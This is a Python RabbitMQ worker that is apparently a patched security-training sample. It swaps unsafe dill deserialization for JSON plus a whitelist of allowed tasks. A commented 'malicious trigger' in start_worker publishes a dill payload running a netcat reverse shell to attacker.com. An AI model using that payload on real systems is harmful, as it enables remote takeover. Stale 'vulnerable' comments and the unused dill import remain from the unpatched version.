import os
import sys
import pika
import dill
import uuid
import sqlite3
import logging
from datetime import datetime

# Configure logging for the Distributed Task Worker
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - TaskWorker - %(levelname)s - %(message)s'
)
logger = logging.getLogger("DistributedWorker")

DB_FILE = "worker_metrics.db"
RABBITMQ_HOST = os.getenv("RABBITMQ_HOST", "localhost")
QUEUE_NAME = "analytics_compute_tasks"

def init_metrics_db():
    """Initializes the SQLite database for tracking task execution metrics."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE task_metrics (
            task_id TEXT PRIMARY KEY,
            executed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            status TEXT NOT NULL,
            execution_time_ms INTEGER,
            error_details TEXT
        )
    ''')
    
    # Pre-populate with historical mock metrics
    mock_metrics = [
        ('task_abc123', datetime.now().isoformat(), 'SUCCESS', 450, ''),
        ('task_def456', datetime.now().isoformat(), 'FAILED', 12, 'MemoryError')
    ]
    cursor.executemany('''
        INSERT INTO task_metrics (task_id, executed_at, status, execution_time_ms, error_details)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_metrics)
    
    conn.commit()
    conn.close()
    logger.info("Worker metrics database initialized.")

def log_task_metric(task_id: str, status: str, duration: int, error: str = ""):
    """Records the outcome of a distributed task execution."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO task_metrics (task_id, status, execution_time_ms, error_details) VALUES (?, ?, ?, ?)",
            (task_id, status, duration, error)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Failed to log task metric {task_id}: {e}")

def execute_serialized_lambda(task_payload: bytes, task_id: str) -> bool:
    """
    SECURE: Uses JSON and a pre-defined task registry to prevent Unsafe Deserialization (CWE-502).
    """
    import json
    
    logger.info(f"[{task_id}] Parsing analytic compute task securely.")
    start_time = datetime.now()
    
    # Secure: Instead of sending executable code over the wire, we maintain a local registry 
    # of safe, pre-defined functions that this worker is permitted to execute.
    ALLOWED_TASKS = {
        "calculate_average": lambda args: sum(args) / len(args) if args else 0,
        "count_records": lambda args: len(args)
    }
    
    try:
        # Secure: We replace the unsafe 'dill' module with standard json.
        # json.loads() only parses primitive data structures (dicts, lists, strings, numbers)
        # and strictly prevents arbitrary object instantiation or remote code execution.
        task_dict = json.loads(task_payload.decode('utf-8'))
        
        if isinstance(task_dict, dict) and "task_name" in task_dict:
            task_name = task_dict["task_name"]
            args = task_dict.get("args", [])
            
            if task_name in ALLOWED_TASKS:
                logger.debug(f"[{task_id}] Task '{task_name}' validated. Executing function...")
                # Execute the pre-approved local function safely with the provided arguments
                result = ALLOWED_TASKS[task_name](args)
                logger.info(f"[{task_id}] Task completed with result: {result}")
            else:
                logger.warning(f"[{task_id}] Task '{task_name}' is not in the allowed registry.")
                raise ValueError(f"Unauthorized task requested: {task_name}")
        else:
            logger.warning(f"[{task_id}] Decoded JSON is missing the required 'task_name' key.")
            raise ValueError("Invalid task payload structure.")
            
        duration = int((datetime.now() - start_time).total_seconds() * 1000)
        log_task_metric(task_id, "SUCCESS", duration)
        return True
            
    except (json.JSONDecodeError, UnicodeDecodeError) as e:
        duration = int((datetime.now() - start_time).total_seconds() * 1000)
        logger.error(f"[{task_id}] Failed to parse task payload as JSON: {e}")
        log_task_metric(task_id, "FAILED", duration, "JSON Parse Error")
        return False
    except ValueError as e:
        duration = int((datetime.now() - start_time).total_seconds() * 1000)
        logger.error(f"[{task_id}] Task validation failed: {e}")
        log_task_metric(task_id, "FAILED", duration, str(e))
        return False
    except Exception as e:
        duration = int((datetime.now() - start_time).total_seconds() * 1000)
        logger.error(f"[{task_id}] Unexpected error during task execution: {e}")
        log_task_metric(task_id, "FAILED", duration, "Internal Execution Error")
        return False

def on_message_received(ch, method, properties, body):
    """Callback for when a message is consumed from the RabbitMQ queue."""
    task_id = properties.correlation_id or f"task_{uuid.uuid4().hex[:8]}"
    logger.info(f"Received new compute task: {task_id}")
    
    # Pass the untrusted raw byte payload from RabbitMQ to the vulnerable function
    success = execute_serialized_lambda(body, task_id)
    
    if success:
        logger.info(f"[{task_id}] Acknowledging message.")
        ch.basic_ack(delivery_tag=method.delivery_tag)
    else:
        logger.warning(f"[{task_id}] Rejecting message due to failure.")
        # Reject and do not requeue to avoid poison message loops
        ch.basic_reject(delivery_tag=method.delivery_tag, requeue=False)

def start_worker():
    """Configures and starts the Pika RabbitMQ consumer loop."""
    init_metrics_db()
    
    try:
        connection = pika.BlockingConnection(
            pika.ConnectionParameters(host=RABBITMQ_HOST)
        )
        channel = connection.channel()
        
        # Ensure the queue exists
        channel.queue_declare(queue=QUEUE_NAME, durable=True)
        
        # Only prefetch one task at a time per worker
        channel.basic_qos(prefetch_count=1)
        
        channel.basic_consume(
            queue=QUEUE_NAME, 
            on_message_callback=on_message_received
        )
        
        # Example Malicious Trigger (published by an attacker via pika producer script):
        # import pika, dill, os
        # payload = dill.dumps(lambda: os.system('nc -e /bin/sh attacker.com 4444'))
        # connection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))
        # channel = connection.channel()
        # channel.basic_publish(exchange='', routing_key='analytics_compute_tasks', body=payload)
        
        logger.info(f"Waiting for analytical tasks on '{QUEUE_NAME}'. To exit press CTRL+C")
        channel.start_consuming()
        
    except pika.exceptions.AMQPConnectionError:
        logger.error(f"Could not connect to RabbitMQ broker at {RABBITMQ_HOST}")
        sys.exit(1)
    except KeyboardInterrupt:
        logger.info("Worker shutting down gracefully.")
        if 'connection' in locals() and connection.is_open:
            connection.close()

if __name__ == "__main__":
    start_worker()
